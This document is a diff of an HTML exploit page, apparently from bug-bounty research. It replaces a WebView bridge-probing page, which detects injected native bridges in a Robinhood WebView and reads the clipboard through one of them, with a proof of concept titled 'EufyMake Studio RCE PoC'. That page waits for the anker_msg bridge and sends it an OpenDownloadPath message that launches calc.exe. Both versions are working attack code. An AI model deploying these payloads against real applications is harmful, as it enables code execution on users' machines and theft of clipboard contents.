@@ -1,120 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Robinhood WebView Bridge Test</title>
-  <style>
-    body {
-      background: #000;
-      color: #0f0;
-      font-family: monospace;
-      padding: 20px;
-    }
-    .ok { color: #0f0; }
-    .warn { color: orange; }
-    .bad { color: red; }
-    .box {
-      border: 1px solid #0f0;
-      padding: 10px;
-      margin-top: 10px;
-      word-break: break-all;
-    }
-  </style>
+    <title>EufyMake Studio RCE PoC (Old Session)</title>
 </head>
-<body>
-
-<h1>[+] Bridge Detection Test</h1>
-<div id="results">Running checks...</div>
-
-<script>
-function log(msg, cls="ok") {
-  const el = document.createElement("div");
-  el.className = cls;
-  el.innerText = msg;
-  document.getElementById("results").appendChild(el);
-}
-
-function testBridges() {
-  let found = false;
-
-  // ===== CRITICAL: Microgram =====
-  if (window._microgramEntryPoint) {
-    log("[CRITICAL] _microgramEntryPoint FOUND", "bad");
-    found = true;
-
-    try {
-      const channel = new MessageChannel();
-      channel.port1.onmessage = (event) => {
-        try {
-          const res = JSON.parse(event.data);
-          log("[+] Clipboard response received", "warn");
-
-          const box = document.createElement("div");
-          box.className = "box";
-          box.innerText = "Clipboard: " + res.payload;
-          document.body.appendChild(box);
-        } catch(e) {
-          log("[-] Failed to parse clipboard response", "warn");
+<body style="background-color: #222; color: #0f0; text-align: center; padding-top: 50px; font-family: monospace;">
+    <h1>SYSTEM_COMPROMISED</h1>
+    <p id="status">Waiting for bridge...</p>
+    <script>
+        function trigger() {
+            const status = document.getElementById('status');
+            if (window.anker_msg) {
+                status.innerText = "[+] BRIDGE FOUND: Executing OpenDownloadPath sink...";
+                window.anker_msg.postMessage(JSON.stringify({
+                    "action": "OpenDownloadPath", 
+                    "data": { 
+                        "path": "C:\\Windows\\System32\\calc.exe" 
+                    }
+                }));
+            } else {
+                setTimeout(trigger, 100);
+            }
         }
-      };
-
-      window._microgramEntryPoint.postMessage(JSON.stringify({
-        target: "mg.ui.pasteboard#implementation",
-        messageId: "test",
-        payload: "{}",
-        wantsReply: true,
-        isReply: false
-      }), [channel.port2]);
-
-    } catch (e) {
-      log("[-] Microgram bridge call failed: " + e.message, "warn");
-    }
-  }
-
-  // ===== HIGH: HtmlCanvasContentBridge =====
-  if (window.HtmlCanvasContentBridge) {
-    log("[HIGH] HtmlCanvasContentBridge FOUND", "warn");
-    found = true;
-
-    try {
-      log("[+] Methods: " + Object.keys(window.HtmlCanvasContentBridge).join(", "), "warn");
-    } catch(e) {
-      log("[+] Bridge present (method enumeration failed)", "warn");
-    }
-  }
-
-  // ===== HIGH: android_hook =====
-  if (window.android_hook) {
-    log("[HIGH] android_hook FOUND", "warn");
-    found = true;
-
-    try {
-      log("[+] Methods: " + Object.keys(window.android_hook).join(", "), "warn");
-    } catch(e) {
-      log("[+] android_hook present (method enumeration failed)", "warn");
-    }
-  }
-
-  // ===== Generic Android =====
-  if (window.android || window.Android) {
-    log("[INFO] Generic Android interface detected", "warn");
-    found = true;
-  }
-
-  // ===== Sprig/UserLeap =====
-  if (window.sprig || window.userleap) {
-    log("[INFO] Sprig/UserLeap detected", "warn");
-    found = true;
-  }
-
-  if (!found) {
-    log("[SAFE] No privileged bridge detected", "ok");
-  }
-}
-
-// delay to allow bridge injection
-setTimeout(testBridges, 1200);
-</script>
-
+        trigger();
+    </script>
 </body>
 </html>
